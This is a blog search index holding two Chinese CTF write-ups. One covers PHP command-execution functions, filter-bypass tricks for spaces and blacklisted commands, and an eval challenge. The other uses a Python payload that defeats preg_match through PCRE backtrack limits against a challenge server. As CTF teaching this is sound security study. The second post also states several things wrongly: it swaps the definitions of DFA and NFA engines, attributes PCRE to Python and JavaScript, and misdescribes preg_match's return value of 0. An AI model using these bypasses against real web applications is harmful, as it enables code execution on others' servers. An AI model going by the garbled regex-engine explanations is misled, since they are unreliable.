<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>PHP命令执行函数</title>
    <link href="/2025/03/27/PHP%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%87%BD%E6%95%B0/"/>
    <url>/2025/03/27/PHP%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%87%BD%E6%95%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="命令执行函数"><a href="#命令执行函数" class="headerlink" title="命令执行函数"></a>命令执行函数</h1><p>水一篇</p><h2 id="命令执行函数："><a href="#命令执行函数：" class="headerlink" title="命令执行函数："></a>命令执行函数：</h2><ol><li><code>system()</code><br>执行命令并输出结果。只返回最后一行的输出。</li><li><code>exec()</code><br>执行命令并将输出存入数组，仅返回最后一行的输出。</li><li><code>shell_exec()</code><br>执行命令并返回完整输出（字符串）。</li><li><code>passthru()</code><br>执行命令并直接输出结果，适用于二进制数据（如 <code>cat</code>、<code>ffmpeg</code>）。</li><li>反引号(&#96;&#96;)<br>类似 <code>shell_exec()</code>，直接执行命令并返回输出。</li><li><code>popen()</code><br>打开一个进程，并返回管道资源，可用于读取或写入。</li><li><code>proc_open()</code><br>高级用法，可创建进程并管理输入、输出流。</li></ol><h2 id="输出文件内容的函数："><a href="#输出文件内容的函数：" class="headerlink" title="输出文件内容的函数："></a>输出文件内容的函数：</h2><table><thead><tr><th>命令</th><th>功能</th></tr></thead><tbody><tr><td><code>cat</code></td><td>读取文件并输出所有内容</td></tr><tr><td><code>tac</code></td><td>倒序显示文件内容</td></tr><tr><td><code>nl</code></td><td>显示行号</td></tr><tr><td><code>more</code></td><td>分页显示文件内容</td></tr><tr><td><code>less</code></td><td>分页显示文件，可向前翻页、搜索</td></tr><tr><td><code>head</code></td><td>仅显示前 N 行</td></tr><tr><td><code>tail</code></td><td>仅显示后 N 行，支持实时跟踪</td></tr><tr><td><code>sort</code></td><td>对文本行排序</td></tr><tr><td><code>awk</code></td><td>按列处理文本</td></tr><tr><td><code>sed</code></td><td>文本替换和筛选</td></tr><tr><td><code>grep</code></td><td>查找并输出匹配行</td></tr><tr><td><code>cut</code></td><td>提取文本中特定列</td></tr><tr><td><code>tee</code></td><td>输出到终端+文件</td></tr><tr><td><code>strings</code></td><td>提取二进制文件中的可读文本</td></tr><tr><td><code>xxd</code></td><td>以十六进制格式显示文件</td></tr></tbody></table><h2 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a>空格绕过</h2><figure class="highlight erlang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs erlang"><span class="hljs-string">$&#123;</span>IFS&#125;<br>&#123;IFS&#125;<span class="hljs-string">$9</span><br><span class="hljs-string">$I</span>FS<span class="hljs-string">$9</span><br><span class="hljs-comment">%09（水平制表符）绕过</span><br>重定向符：&lt;&gt;<br><span class="hljs-comment">%0a回车</span><br><span class="hljs-comment">%0d换行</span><br><span class="hljs-comment">%20空格</span><br>反斜杠 \ 分隔<br>\u00A0 Unicode 空格<br></code></pre></td></tr></table></figure><h1 id="简单rce"><a href="#简单rce" class="headerlink" title="简单rce"></a>简单rce</h1><p>进入后发现是一个代码审计。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">PolarD&amp;N CTF</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">no</span>(<span class="hljs-params"><span class="hljs-variable">$txt</span></span>)</span>&#123;<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/cat|more|less|head|tac|tail|nl|od|vim|uniq|system|proc_open|shell_exec|popen| /i&quot;</span>, <span class="hljs-variable">$txt</span>))&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$txt</span>;&#125;<br>   <span class="hljs-keyword">else</span>&#123;<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;what&#x27;s up&quot;</span>);&#125;&#125;<br><span class="hljs-variable">$yyds</span>=(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;yyds&#x27;</span>]);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;sys&#x27;</span>])&amp;&amp;<span class="hljs-variable">$yyds</span>==<span class="hljs-string">&#x27;666&#x27;</span>)&#123;<br>  <span class="hljs-keyword">eval</span>(<span class="hljs-title function_ invoke__">no</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;sys&#x27;</span>]));<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>    &#123;<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;nonono&quot;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>发现在get传输的sys参数会进行过滤，这道题就是让我们绕过后执行命令。</p><p>它这个题没有过滤掉命令执行函数<code>passthru()</code>，我们用它来执行命令。</p><p>先查看根目录下文件有什么，空格用<code>$&#123;IFS&#125;</code>绕过：</p><img src="/2025/03/27/PHP%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%87%BD%E6%95%B0/123.png" class=""><p>可以看到有flag文件，如何我们需要读取flag，可以用sort来查看flag。</p><img src="/2025/03/27/PHP%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%87%BD%E6%95%B0/456.png" class="">]]></content>
    
    
    
    <tags>
      
      <tag>PHP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>preg_match()绕过</title>
    <link href="/2025/03/26/preg-match%E7%BB%95%E8%BF%87/"/>
    <url>/2025/03/26/preg-match%E7%BB%95%E8%BF%87/</url>
    
    <content type="html"><![CDATA[<h1 id="preg-match-绕过"><a href="#preg-match-绕过" class="headerlink" title="preg_match()绕过"></a>preg_match()绕过</h1><h2 id="pcre-backtrack-limit和pcre-recursion-limit区别："><a href="#pcre-backtrack-limit和pcre-recursion-limit区别：" class="headerlink" title="pcre.backtrack_limit和pcre.recursion_limit区别："></a><code>pcre.backtrack_limit</code>和<code>pcre.recursion_limit</code>区别：</h2><p><code>pcre.backtrack_limit</code> 和 <code>pcre.recursion_limit</code> 是 PHP 中 PCRE（Perl Compatible Regular Expressions）库的两个配置选项，主要用于控制正则表达式的执行行为，以防止资源耗尽或导致程序崩溃。</p><ol><li><p><code>pcre.backtrack_limit</code></p><p><strong>作用</strong>：设置正则表达式回溯（backtracking）的最大次数。<br><strong>默认值</strong>：<code>1000000</code><br><strong>影响</strong>：如果正则表达式匹配过程中超过了该限制，<code>preg_*</code> 函数（如 <code>preg_match()</code>）会返回 <code>false</code> 并触发 <code>PREG_BACKTRACK_LIMIT_ERROR</code> 错误。<br><strong>调整方式</strong>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;pcre.backtrack_limit&#x27;</span>, <span class="hljs-string">&#x27;10000000&#x27;</span>); <span class="hljs-comment">// 增加回溯限制</span><br></code></pre></td></tr></table></figure><p>&#x3D;&#x3D;这个参数在php 5.2.0版本之后可用。&#x3D;&#x3D;</p><p>例如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;pcre.backtrack_limit&#x27;</span>, <span class="hljs-string">&#x27;1000&#x27;</span>); <span class="hljs-comment">// 限制回溯次数，这个值不要设置的太低，可能导致匹配失败。</span><br><span class="hljs-variable">$pattern</span> = <span class="hljs-string">&#x27;/(a+)+/&#x27;</span>; <span class="hljs-comment">// 具有大量回溯的正则</span><br><span class="hljs-variable">$string</span> = <span class="hljs-title function_ invoke__">str_repeat</span>(<span class="hljs-string">&#x27;a&#x27;</span>, <span class="hljs-number">1000</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-variable">$pattern</span>, <span class="hljs-variable">$string</span>)) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;匹配成功&quot;</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;匹配失败或超出回溯限制&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>这个代码还涉及到一个问题，可能会引发回溯爆炸。<br>问题代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$pattern</span> = <span class="hljs-string">&#x27;/(a+)+/&#x27;</span>; <br></code></pre></td></tr></table></figure><p><code>(a+)</code>：匹配至少一个 “a”，并作为一个捕获组。</p><p><code>(a+)+</code>：外层的 <code>+</code> 让整个 <code>(a+)</code> 结构可以重复多次。<br>原因是它使用了由两个嵌套的 <strong>贪心量词 <code>+</code></strong> 组成，<code>a+</code>：匹配 <strong>一个或多个</strong> <code>&#39;a&#39;</code>。<code>(a+)+</code>：将 <code>a+</code> 作为一个整体，再次应用 <strong>一个或多个</strong> 进行匹配。如果输入字符串是一个长串的 <code>&#39;a&#39;</code>（例如 <code>&quot;aaaaaaa&quot;</code>），正则引擎会尝试不同的匹配方式，导致指数级的回溯。<br>减少回溯方法：</p><ol><li><p>简化为<code>/a+/</code>如果你只是想匹配连续的 <code>&quot;a&quot;</code>，不需要额外的重复匹配组，可以直接用：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$pattern</span> = <span class="hljs-string">&#x27;/a+/&#x27;</span>;<br></code></pre></td></tr></table></figure></li><li><p>使用占有量修饰符（PHP 7.3+）<br><strong>如果你的 PHP 版本 &gt;&#x3D; 7.3，可以用 <code>+</code> 后加 <code>\*</code> 让匹配不回溯</strong>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$pattern</span> = <span class="hljs-string">&#x27;/(?:a++)/&#x27;</span>;<br></code></pre></td></tr></table></figure><p><strong>占有量修饰符 <code>++</code></strong> 让 <code>a+</code> <strong>一次性</strong> 匹配所有 “a”，不允许回溯，大幅优化性能！在 <code>a+</code> 里：</p><ul><li><code>+</code> 是<strong>贪心匹配</strong>，会匹配尽可能多的 <code>&#39;a&#39;</code>，但如果后续匹配失败，会回溯，尝试不同的组合。</li><li><code>++</code> 是<strong>独占量词（Possessive Quantifier）</strong>，它不会回溯。一旦 <code>a++</code> 匹配后，就不会重新拆分匹配。</li></ul><table><thead><tr><th><strong>正则</strong></th><th><strong>是否有回溯</strong></th><th><strong>推荐使用情况</strong></th></tr></thead><tbody><tr><td>&#96;&#x2F;(a+)+&#x2F;</td><td><strong>可能回溯爆炸</strong></td><td>❌ <strong>避免使用</strong></td></tr><tr><td><code>/(?:a+)+/</code></td><td><strong>仍可能回溯</strong></td><td>❌ <strong>仍需优化</strong></td></tr><tr><td><code>/a+/</code></td><td><strong>无回溯，最快</strong></td><td>✅ <strong>推荐使用</strong></td></tr><tr><td><code>/(?:a++)/</code></td><td><strong>最优，无回溯</strong></td><td>✅ <strong>PHP 7.3+ 推荐</strong></td></tr></tbody></table><p><strong>PHP 版本 &gt;&#x3D; 7.3</strong>，建议使用：</p><ul><li><strong><code>(?&gt;a+)</code></strong> 原子组</li><li><strong><code>a++</code></strong> 独占量词</li></ul><p>这两种方式都可以有效避免回溯爆炸，提高正则匹配的效率！</p></li></ol></li><li><p><code>pcre.recursion_limit</code></p><p><strong>作用</strong>：设置正则表达式递归调用的最大深度。<br><strong>默认值</strong>：<code>100000</code><br><strong>影响</strong>：如果递归深度超过该限制，会导致 <code>preg_*</code> 函数返回 <code>false</code> 并触发 <code>PREG_RECURSION_LIMIT_ERROR</code> 错误。<br><strong>调整方式</strong>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;pcre.recursion_limit&#x27;</span>, <span class="hljs-string">&#x27;1000000&#x27;</span>); <span class="hljs-comment">// 增加递归限制</span><br></code></pre></td></tr></table></figure><p><strong>示例</strong>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;pcre.recursion_limit&#x27;</span>, <span class="hljs-string">&#x27;100&#x27;</span>); <span class="hljs-comment">// 限制递归深度</span><br><span class="hljs-variable">$pattern</span> = <span class="hljs-string">&#x27;/(a?)+/&#x27;</span>; <span class="hljs-comment">// 递归较深的正则</span><br><span class="hljs-variable">$string</span> = <span class="hljs-title function_ invoke__">str_repeat</span>(<span class="hljs-string">&#x27;a&#x27;</span>, <span class="hljs-number">1000</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-variable">$pattern</span>, <span class="hljs-variable">$string</span>)) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;匹配成功&quot;</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;匹配失败或超出递归限制&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>如果 <code>pcre.recursion_limit</code> 设得太低，可能会导致递归超限错误。</p></li><li><p>解决 PCRE 限制错误的方法</p><p>如果遇到 <code>PREG_BACKTRACK_LIMIT_ERROR</code>：</p><ul><li><p><strong>优化正则表达式</strong>，避免过多的回溯，例如使用更具体的匹配模式。</p></li><li><p><strong>增加 <code>pcre.backtrack_limit</code></strong>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;pcre.backtrack_limit&#x27;</span>, <span class="hljs-string">&#x27;10000000&#x27;</span>);<br></code></pre></td></tr></table></figure></li></ul><p>如果遇到 <code>PREG_RECURSION_LIMIT_ERROR</code>：</p><ul><li><p><strong>优化正则表达式</strong>，减少递归依赖，例如避免 <code>(a?)+</code> 这种结构。</p></li><li><p><strong>增加 <code>pcre.recursion_limit</code></strong>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;pcre.recursion_limit&#x27;</span>, <span class="hljs-string">&#x27;1000000&#x27;</span>);<br></code></pre></td></tr></table></figure></li><li><p><strong>调整 PHP 进程的栈大小</strong>（递归过深可能导致栈溢出）。</p></li></ul></li></ol><h2 id="回溯绕过"><a href="#回溯绕过" class="headerlink" title="回溯绕过"></a>回溯绕过</h2><h3 id="正则表达式引擎"><a href="#正则表达式引擎" class="headerlink" title="正则表达式引擎"></a>正则表达式引擎</h3><p>正则表达式的引擎主要被细分为两大类：</p><ol><li><p><strong>DFA（Deterministic Finite Automaton，确定性有限状态自动机）</strong><br>它&#x3D;&#x3D;使用回溯进行匹配&#x3D;&#x3D;，允许贪心量词、回溯引用等高级功能。</p><ul><li><strong>支持回溯</strong>：会尝试不同路径进行匹配（可能导致回溯爆炸）。</li><li><strong>支持回溯引用</strong>：如 <code>\1</code> 代表前面捕获的分组。</li><li><strong>支持环视</strong>：如 <code>(?=...)</code>、<code>(?&lt;=...)</code>。</li><li><strong>匹配复杂度较高</strong>：部分情况可能导致&#x3D;&#x3D;指数级&#x3D;&#x3D;时间复杂度（如 <code>(a+)+</code>）。</li><li><strong>匹配顺序</strong>：一般是从左到右、按顺序进行匹配，一旦找到匹配，就不会继续尝试别的可能性。</li></ul><p><strong>典型的 NFA 正则引擎</strong></p><table><thead><tr><th>正则引擎</th><th>所属语言 &#x2F; 软件</th><th>备注</th></tr></thead><tbody><tr><td>PCRE（Perl Compatible Regular Expressions）</td><td>PHP、Perl、Python（re 模块）、JavaScript</td><td>最常见，支持回溯引用、环视</td></tr><tr><td>Oniguruma</td><td>Ruby、PHP（部分版本）</td><td>强大，支持 Unicode</td></tr><tr><td>.NET Regex Engine</td><td>C# &#x2F; .NET</td><td>支持回溯，功能丰富</td></tr><tr><td>Java Regular Expressions (java.util.regex)</td><td>Java</td><td>NFA，但部分实现可优化</td></tr></tbody></table></li><li><p><strong>NFA（Nondeterministic Finite Automaton，非确定性有限状态自动机）</strong><br>DFA 不使用回溯，它会一次性扫描整个输入，不会进行回溯，因此匹配速度快且时间复杂度是线性的 O(n)。</p><ul><li><strong>不支持回溯</strong>：不会尝试不同路径，一旦选择了某个匹配路径就不会回头。</li><li><strong>不支持回溯引用</strong>：<code>\1</code> 之类的语法在 DFA 引擎中无法使用。</li><li><strong>不支持环视</strong>：例如 <code>(?=...)</code> 和 <code>(?&lt;=...)</code> 不可用。</li><li><strong>匹配速度快</strong>：在大多数情况下，比 NFA 速度快，适用于大规模文本处理。</li></ul><p><strong>典型的 DFA 正则引擎</strong></p><table><thead><tr><th>正则引擎</th><th>所属语言 &#x2F; 软件</th><th>备注</th></tr></thead><tbody><tr><td>RE2</td><td>Google（Golang、Google RE2 库）</td><td><strong>无回溯爆炸</strong>，高效</td></tr><tr><td>Hyperscan</td><td>Intel</td><td>高性能，适用于安全检测</td></tr><tr><td>POSIX Regular Expressions</td><td>Linux <code>grep</code>, <code>awk</code>, <code>sed</code></td><td>确保找到<strong>最长匹配</strong></td></tr></tbody></table></li></ol><p>由于NFA的执行过程存在回溯，所以其性能会劣于DFA，但它支持更多功能。大多数程序语言都使用了NFA作为正则引擎。<br><strong>NFA（回溯型）</strong>：功能强大，支持回溯引用、环视，但可能回溯爆炸。<br><strong>DFA（无回溯型）</strong>：匹配速度快、无回溯爆炸，但不支持回溯引用、环视等高级功能。</p><p><strong>如果正则匹配慢或有回溯爆炸风险</strong>，可以：</p><ul><li>✅ 改用 DFA 引擎（如 RE2）</li><li>✅ 使用独占量词 <code>++</code> 或原子组 <code>(?&gt;...)</code></li><li>✅ 选择合适的正则结构，避免 <code>(a+)+</code> 之类的问题</li></ul><h3 id="什么是回溯"><a href="#什么是回溯" class="headerlink" title="什么是回溯"></a>什么是回溯</h3><p>当正则表达式包含重复量词（如 <code>*</code>, <code>+</code>, <code>&#123;m,n&#125;</code>）或分支选择（如 <code>|</code>）时，匹配可能有多种可能的路径。如果当前路径匹配失败，正则引擎会回溯，尝试另一种匹配方式。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$pattern</span> = <span class="hljs-string">&#x27;/ab*c/&#x27;</span>;<br><span class="hljs-variable">$input</span> = <span class="hljs-string">&quot;ac&quot;</span>;<br><span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-variable">$pattern</span>, <span class="hljs-variable">$input</span>);<br></code></pre></td></tr></table></figure><p><strong>匹配过程：</strong></p><ol><li><code>a</code> 匹配 <code>a</code></li><li><code>b*</code> 可以匹配 0 个 <code>b</code>，所以匹配空字符串（贪心匹配）</li><li><code>c</code>匹配 <code>c</code></li><li>匹配成功 🎉</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$pattern</span> = <span class="hljs-string">&#x27;/(a+)+b/&#x27;</span>;<br><span class="hljs-variable">$input</span> = <span class="hljs-string">&#x27;aaaaab&#x27;</span>;<br><span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-variable">$pattern</span>, <span class="hljs-variable">$input</span>, <span class="hljs-variable">$matches</span>);<br></code></pre></td></tr></table></figure><p><code>(a+)+</code>：这是一个<strong>嵌套的重复量词</strong>。<code>a+</code>表示匹配一个或多个<code>a</code>，而外部的<code>+</code>表示匹配一个或多个 <code>a+</code>。<br><code>b</code>：匹配字符 <code>&#39;b&#39;</code>。</p><p><strong>匹配过程：</strong></p><p><strong><code>a+</code>（内层）</strong>：首先，正则引擎尝试匹配一个或多个<code>a</code>，并匹配 <code>aaaaa</code>（5 个 <code>a</code>）。<strong>外部的 <code>+</code>（内层匹配成功后）</strong>：因为我们有外部的 <code>+</code>，所以引擎继续匹配 一个或多个 <code>a+</code>，并且试图扩展匹配，尽量多匹配一些 <code>a</code>。但是这个过程中，<strong>并不是匹配所有的 <code>a</code></strong>，而是会尝试不同的拆分方式：</p><p>第一次尝试：</p><ul><li><code>a+</code> 匹配 5 个 <code>a</code>，然后 <code>+</code> 会继续尝试更多的 <code>a+</code>。</li><li>因为匹配到的是 <code>aaaaa</code>，所以它会尝试剩余的字符。</li><li>此时匹配失败，因为后面没有 <code>b</code>（没有足够的匹配）。</li></ul><p><strong>回溯发生</strong>：</p><ul><li>正则引擎回到之前的状态，并重新尝试其他方式。</li><li>比如，<code>a+</code> 匹配 4 个 <code>a</code>，然后继续尝试更多的 <code>a+</code>。</li><li>继续失败，每次都在试图更多地分配 <code>a+</code> 来满足 <code>b</code>。</li></ul><p>最终回溯到<code>a</code>匹配：因为没有办法找到匹配的方式，所以引擎会继续尝试尽可能地分配不同的匹配方式。</p><h3 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h3><p>上面我们了解了回溯，知道了有回溯的次数限制，那我们可以构造一些超出限制的回溯来进行绕过。</p><p>超过回溯的限制，<code>preg_match</code>返回的非1和0，而是false。</p><h3 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h3><h4 id="swp"><a href="#swp" class="headerlink" title="swp"></a>swp</h4><p>SWP文件是Vim编辑器的交换文件，用于防止数据丢失。它的作用主要包括：</p><ol><li><p>崩溃恢复<br>当用Vim编辑文件时，Vim会自动创建一个<code>.swp</code>文件，用于存储为保存的更改。如果Vim崩溃或异常退出，你可以通过它恢复未保存的内容。</p></li><li><p>防止重复编辑</p><p>如果已经打开了某个文件，Vim会创建对应的<code>.swp</code>文件。如果你再次打开同一个文件，Vim会检测到<code>.swp</code>文件的存在，并警告你该文件已在另一个Vim进程中打开，防止多个Vim实例同时编辑同一文件导致冲突。</p></li></ol><p>管理SWP文件：</p><ol><li><p>删除 SWP 文件<br>如果确定 Vim 进程已经关闭，并且不需要恢复数据，可以手动删除 <code>.swp</code> 文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">rm</span> .filename.swp<br></code></pre></td></tr></table></figure></li><li><p>恢复未保存的文件<br>如果Vim崩溃后需要恢复文件，可以使用：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">vim -r filename<br></code></pre></td></tr></table></figure><p>Vim会从<code>.swp</code>文件中恢复内容。</p></li><li><p>关闭 SWP 文件自动创建<br>如果不希望 Vim 生成 <code>.swp</code> 文件，可以在 Vim 配置文件（<code>~/.vimrc</code>）中添加：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">set</span> noswapfile<br></code></pre></td></tr></table></figure></li></ol><p>这个题提示<code>true .swp file?</code>，猜测有swp文件，拿dirsearch扫一下。发现存在swp文件。</p><img src="/2025/03/26/preg-match%E7%BB%95%E8%BF%87/1.png" class=""><p>访问这个路径。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">jiuzhe</span>(<span class="hljs-params"><span class="hljs-variable">$xdmtql</span></span>)</span>&#123; <br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/sys.*nb/is&#x27;</span>,<span class="hljs-variable">$xdmtql</span>); <br>&#125; <br><span class="hljs-variable">$xdmtql</span>=@<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;xdmtql&#x27;</span>]; <br><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$xdmtql</span>))&#123; <br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">jiuzhe</span>(<span class="hljs-variable">$xdmtql</span>))&#123; <br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$xdmtql</span>,<span class="hljs-string">&#x27;sys nb&#x27;</span>)!==<span class="hljs-literal">false</span>)&#123; <br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;flag&#123;*******&#125;&#x27;</span>; <br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123; <br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;true .swp file?&#x27;</span>; <br>        &#125; <br>    &#125;<span class="hljs-keyword">else</span>&#123; <br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;nijilenijile&#x27;</span>; <br>    &#125; <br>&#125;<br></code></pre></td></tr></table></figure><p>这里的关键是preg_match要匹配到，strpos不要匹配到。这里就涉及到了回溯的问题，preg_match处理的字符串有长度限制，如果超过这个长度就会返回false。</p><p>payload：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br>data = &#123;<span class="hljs-string">&quot;xdmtql&quot;</span>: <span class="hljs-string">&quot;sys nb&quot;</span> + <span class="hljs-string">&quot;aaaabbcc&quot;</span> * <span class="hljs-number">1000000</span>&#125;<br>res = requests.post(<span class="hljs-string">&#x27;http://b43c54e2-ef79-414a-b00c-100fba061194.www.polarctf.com:8090/&#x27;</span>, data=data, allow_redirects=<span class="hljs-literal">False</span>)<br><span class="hljs-built_in">print</span>(res.content)<br></code></pre></td></tr></table></figure><img src="/2025/03/26/preg-match%E7%BB%95%E8%BF%87/2.png" class=""><h3 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h3><p>使用 <code>===</code> 可以确保判断条件严格区分 <code>false</code> 和 <code>0</code>。</p><p><code>preg_match()</code> 返回值的含义：</p><ul><li><strong><code>false</code></strong>：正则匹配过程中出错。</li><li><strong><code>0</code></strong>：匹配成功，但没有找到任何符合条件的匹配（例如匹配一个空字符串）。</li><li><strong><code>1</code></strong>：匹配成功，并找到了至少一个符合条件的匹配项。</li></ul><p>因此，使用 <code>===</code> 来判断时，可以区分 <code>false</code> 和 <code>0</code>，避免误判。</p>]]></content>
    
    
    
    <tags>
      
      <tag>PHP</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
